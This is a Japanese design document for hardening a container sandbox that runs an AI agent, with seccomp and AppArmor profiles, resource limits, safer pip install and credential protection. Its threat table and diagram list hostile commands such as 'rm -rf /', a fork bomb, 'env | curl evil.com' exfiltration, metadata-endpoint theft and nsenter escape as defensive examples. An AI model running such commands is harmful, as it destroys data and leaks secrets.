# 3. セキュリティ強化

## 3.1 多層防御モデル

```
┌─────────────────────────────────────────────────────────┐
│ Layer 6: 監査・監視                                      │
│   全コマンド/ファイルアクセス/ネットワーク接続のログ       │
├─────────────────────────────────────────────────────────┤
│ Layer 5: ネットワーク隔離                                │
│   network_mode: none / egress proxy (許可リスト)         │
├─────────────────────────────────────────────────────────┤
│ Layer 4: リソース制限 (cgroups v2)                       │
│   CPU / Memory / PID / I/O / Storage                    │
├─────────────────────────────────────────────────────────┤
│ Layer 3: システムコール制限 (seccomp + AppArmor)         │
│   危険な syscall の拒否 / ファイルアクセス制御            │
├─────────────────────────────────────────────────────────┤
│ Layer 2: コンテナ隔離                                    │
│   独立した PID / Mount / Network / IPC 名前空間          │
├─────────────────────────────────────────────────────────┤
│ Layer 1: ユーザー権限                                    │
│   非root実行 / Capability 削除 / no-new-privileges       │
└─────────────────────────────────────────────────────────┘
```

## 3.2 seccomp プロファイル

### 設計方針

Docker デフォルトの seccomp プロファイルをベースに、エージェント実行に不要な syscall を追加でブロックする。

### `sandbox-seccomp.json`

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "comment": "Sandbox seccomp profile - allowlist approach",
  "syscalls": [
    {
      "comment": "基本的なファイル操作",
      "names": [
        "read", "write", "open", "close", "stat", "fstat", "lstat",
        "poll", "lseek", "mmap", "mprotect", "munmap", "brk",
        "pread64", "pwrite64", "readv", "writev",
        "access", "pipe", "select", "dup", "dup2", "dup3",
        "fcntl", "flock", "fsync", "fdatasync", "truncate", "ftruncate",
        "getdents", "getdents64", "getcwd", "chdir", "fchdir",
        "rename", "mkdir", "rmdir", "creat", "link", "unlink",
        "symlink", "readlink", "chmod", "fchmod", "chown", "fchown",
        "lchown", "umask", "statfs", "fstatfs",
        "openat", "mkdirat", "mknodat", "fchownat", "unlinkat",
        "renameat", "renameat2", "linkat", "symlinkat", "readlinkat",
        "fchmodat", "faccessat", "newfstatat", "statx"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "comment": "プロセス管理（制限付き）",
      "names": [
        "execve", "execveat",
        "clone", "clone3", "fork", "vfork",
        "wait4", "waitid",
        "exit", "exit_group",
        "kill", "tgkill", "tkill",
        "getpid", "getppid", "gettid", "getpgid", "getpgrp",
        "setpgid", "setsid",
        "getuid", "geteuid", "getgid", "getegid",
        "setuid", "setgid", "setreuid", "setregid",
        "getgroups", "setgroups",
        "prctl", "arch_prctl",
        "set_tid_address", "set_robust_list", "get_robust_list"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "comment": "ネットワーク（network_mode: none で制御、syscall は許可）",
      "names": [
        "socket", "connect", "accept", "accept4",
        "sendto", "recvfrom", "sendmsg", "recvmsg",
        "bind", "listen", "getsockname", "getpeername",
        "setsockopt", "getsockopt", "shutdown",
        "epoll_create", "epoll_create1", "epoll_ctl", "epoll_wait",
        "epoll_pwait", "epoll_pwait2",
        "ppoll", "pselect6"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "comment": "メモリ管理",
      "names": [
        "madvise", "mremap", "msync", "mincore",
        "shmget", "shmat", "shmctl", "shmdt",
        "memfd_create", "membarrier"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "comment": "時間・タイマー",
      "names": [
        "gettimeofday", "clock_gettime", "clock_getres",
        "clock_nanosleep", "nanosleep",
        "timer_create", "timer_settime", "timer_gettime",
        "timer_getoverrun", "timer_delete",
        "timerfd_create", "timerfd_settime", "timerfd_gettime"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "comment": "シグナル",
      "names": [
        "rt_sigaction", "rt_sigprocmask", "rt_sigreturn",
        "rt_sigpending", "rt_sigtimedwait", "rt_sigsuspend",
        "sigaltstack", "signalfd", "signalfd4"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "comment": "Pipe / EventFD",
      "names": [
        "pipe2", "eventfd", "eventfd2",
        "inotify_init", "inotify_init1",
        "inotify_add_watch", "inotify_rm_watch"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "comment": "その他必須",
      "names": [
        "futex", "futex_waitv",
        "ioctl",
        "uname",
        "sysinfo",
        "getrlimit", "setrlimit", "prlimit64",
        "getrandom",
        "rseq",
        "close_range",
        "copy_file_range",
        "splice", "tee", "sendfile"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

### 明示的にブロックされる危険な syscall

| syscall | 理由 |
|---------|------|
| `mount`, `umount2` | ファイルシステムの変更防止 |
| `pivot_root`, `chroot` | ルート変更によるエスケープ防止 |
| `reboot`, `kexec_load` | システム停止防止 |
| `ptrace` | 他プロセスのデバッグ/注入防止 |
| `init_module`, `finit_module`, `delete_module` | カーネルモジュール操作防止 |
| `personality` | 実行ドメイン変更防止 |
| `keyctl`, `request_key`, `add_key` | カーネルキーリング操作防止 |
| `bpf` | eBPF プログラムロード防止 |
| `userfaultfd` | ユーザー空間ページフォルト操作防止 |
| `perf_event_open` | パフォーマンス監視悪用防止 |
| `setns`, `unshare` | 名前空間操作によるエスケープ防止 |
| `acct` | プロセスアカウンティング操作防止 |
| `settimeofday`, `clock_settime` | システム時刻変更防止 |
| `swapon`, `swapoff` | スワップ操作防止 |
| `mknod`, `mknodat` | デバイスファイル作成防止 |

## 3.3 AppArmor プロファイル

### `sandbox-apparmor-profile`

```
#include <tunables/global>

profile sandbox-profile flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/python>

  # === ファイルシステムアクセス制御 ===

  # ワークスペース: 読み書き可能
  /work/** rw,
  /work/ r,

  # 一時ディレクトリ: 読み書き可能
  /tmp/** rw,
  /tmp/ r,
  /run/** rw,
  /run/ r,

  # Python / Node.js ランタイム: 読み取り + 実行
  /usr/** r,
  /usr/bin/** ix,
  /usr/lib/** r,
  /usr/local/** r,
  /usr/local/bin/** ix,

  # Node.js / npm
  /usr/bin/node ix,
  /usr/bin/npm ix,
  /usr/lib/node_modules/** r,

  # Python
  /usr/local/bin/python* ix,
  /usr/local/lib/python*/** r,

  # pip install 先 (ワークスペース内)
  /work/.local/** rw,
  /work/.local/bin/* ix,

  # 基本コマンド
  /bin/** ix,
  /usr/bin/** ix,

  # proc / sys (読み取りのみ)
  @{PROC}/** r,
  /sys/** r,

  # === 明示的な拒否 ===

  # 他のワークスペースへのアクセス禁止
  deny /var/lib/aiagent/** rw,

  # アプリケーションコードへのアクセス禁止
  deny /app/** rw,

  # スキルデータへのアクセス禁止
  deny /skills/** rw,

  # Docker ソケットへのアクセス禁止
  deny /var/run/docker.sock rw,

  # SSH キーへのアクセス禁止
  deny /root/.ssh/** rw,
  deny /home/*/.ssh/** rw,

  # 機密設定ファイルへのアクセス禁止
  deny /etc/shadow r,
  deny /etc/gshadow r,
  deny /etc/sudoers r,
  deny /etc/sudoers.d/** r,

  # ネットワーク（Docker network_mode で制御）
  network,

  # シグナル（自プロセスツリーのみ）
  signal (send) peer=sandbox-profile,
  signal (receive) peer=sandbox-profile,

  # ptrace 禁止
  deny ptrace,
}
```

## 3.4 破壊的コマンド防御

### 防御レイヤー

```
エージェントが rm -rf / を実行しようとした場合:

Layer 1: read-only rootfs
  → / は読み取り専用なので物理的に削除不可
  → /work のみ書き込み可能（ユーザーデータのみ影響）

Layer 2: AppArmor
  → /var, /etc, /usr への書き込みは拒否

Layer 3: cgroups PID 制限
  → fork bomb は 256 プロセスで停止

Layer 4: ストレージ制限
  → dd if=/dev/zero of=/work/fill は 5GB で停止

Layer 5: ネットワーク遮断
  → curl http://evil.com/exfiltrate は接続不可
```

### 具体的な攻撃シナリオと防御

| 攻撃 | コマンド例 | 防御レイヤー |
|------|-----------|-------------|
| ルート破壊 | `rm -rf /` | read-only rootfs |
| ワークスペース破壊 | `rm -rf /work/*` | 許容（S3に永続化済み、復元可能） |
| Fork bomb | `:(){ :\|:& };:` | cgroups PID制限 (256) |
| メモリ枯渇 | `python -c "x='a'*10**12"` | cgroups メモリ制限 (2GB) |
| ディスク枯渇 | `dd if=/dev/zero of=/work/x bs=1G` | ストレージ制限 (5GB) |
| 環境変数窃取 | `env \| curl evil.com` | network_mode: none |
| 他テナント参照 | `ls /var/lib/aiagent/workspaces/` | AppArmor deny + mount namespace |
| メタデータ窃取 | `curl 169.254.169.254` | network_mode: none + egress proxy deny |
| Docker escape | `nsenter --target 1` | seccomp (setns ブロック) + no-new-privileges |
| 権限昇格 | `sudo su` | no-new-privileges + CAP_DROP ALL |
| カーネル攻撃 | `insmod evil.ko` | seccomp (init_module ブロック) |
| プロセス注入 | `ptrace -p 1234` | seccomp (ptrace ブロック) + AppArmor deny |

## 3.5 pip install の安全化

### 課題

エージェントが `pip install` を実行する場合、以下のリスクがある:

1. **悪意あるパッケージ**: `setup.py` 内の任意コード実行
2. **グローバル環境汚染**: 他のセッションへの影響
3. **ディスク枯渇**: 大量パッケージのインストール
4. **ネットワーク悪用**: PyPI アクセスを口実にした外部通信

### 対策

```
┌─────────────────────────────────────────────────────┐
│               pip install の安全化フロー              │
│                                                     │
│  1. インストール先の隔離                              │
│     PIP_TARGET=/work/.local/lib/python3.11/site-packages
│     → コンテナ内 /work は会話専用                     │
│     → コンテナ破棄時に消滅                            │
│                                                     │
│  2. ネットワークアクセス制御                          │
│     pip install 時のみ egress proxy 経由              │
│     → pypi.org, files.pythonhosted.org のみ許可      │
│                                                     │
│  3. インストール先の制限                              │
│     pip.conf:                                       │
│       [global]                                      │
│       target = /work/.local/lib/python3.11/site-packages
│       no-cache-dir = true                           │
│       user = true                                   │
│                                                     │
│  4. ディスク容量制限                                  │
│     /work 全体で 5GB 制限                            │
│     → パッケージ + ユーザーファイルの合計              │
│                                                     │
│  5. setup.py 実行の制限                              │
│     seccomp + AppArmor で危険な操作はブロック済み     │
│     → ネットワーク無し環境では外部通信不可            │
│                                                     │
│  6. 事前インストールパッケージ (Optional)              │
│     よく使われるパッケージをベースイメージに含める     │
│     → pandas, numpy, matplotlib, requests 等        │
│     → pip install のネットワークアクセスを減らす      │
└─────────────────────────────────────────────────────┘
```

### pip.conf の設定

```ini
# /home/sandbox/.pip/pip.conf (コンテナイメージに含める)
[global]
target = /work/.local/lib/python3.11/site-packages
no-cache-dir = true
disable-pip-version-check = true
timeout = 30
retries = 2

[install]
no-warn-script-location = true
```

### 事前インストール推奨パッケージ

```
# requirements-sandbox.txt
# データ処理
pandas>=2.0
numpy>=1.24
openpyxl>=3.1

# 可視化
matplotlib>=3.7

# HTTP (egress proxy 経由時)
requests>=2.31
httpx>=0.24

# ユーティリティ
python-dotenv>=1.0
pyyaml>=6.0
```

## 3.6 環境変数の保護

### 現在のリスク

現行では AWS 認証情報が環境変数として SDK プロセスに渡されている:

```python
# aws_config.py (現行)
env = {
    "CLAUDE_CODE_USE_BEDROCK": "1",
    "AWS_REGION": region,
    "AWS_ACCESS_KEY_ID": settings.aws_access_key_id,      # ← 危険
    "AWS_SECRET_ACCESS_KEY": settings.aws_secret_access_key,  # ← 危険
}
```

### 対策: 最小権限の環境変数

```python
# サンドボックスに渡す環境変数（最小限）
SANDBOX_ENV = {
    # SDK 動作に必要な最小限
    "CLAUDE_CODE_USE_BEDROCK": "1",
    "AWS_REGION": region,
    "HOME": "/home/sandbox",
    "PATH": "/work/.local/bin:/usr/local/bin:/usr/bin:/bin",
    "PYTHONPATH": "/work/.local/lib/python3.11/site-packages",
    "LANG": "C.UTF-8",
    "TERM": "xterm-256color",
}

# AWS認証情報は Backend → Sandbox 間の一時トークンで渡す
# Option A: STS AssumeRole で一時認証 (推奨)
#   - 最小権限の IAM ロールを使用
#   - 有効期限付き (15分)
#   - Bedrock InvokeModel のみ許可

# Option B: Backend がプロキシとして API 呼び出しを仲介
#   - Sandbox にはAWS認証情報を渡さない
#   - Backend が Bedrock 呼び出しを代行
#   - より安全だが SDK の変更が必要
```

### IAM ポリシー（Sandbox 用一時認証）

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "bedrock:InvokeModel",
        "bedrock:InvokeModelWithResponseStream"
      ],
      "Resource": [
        "arn:aws:bedrock:*::foundation-model/anthropic.*"
      ]
    },
    {
      "Effect": "Deny",
      "Action": "*",
      "NotResource": [
        "arn:aws:bedrock:*::foundation-model/anthropic.*"
      ]
    }
  ]
}
```
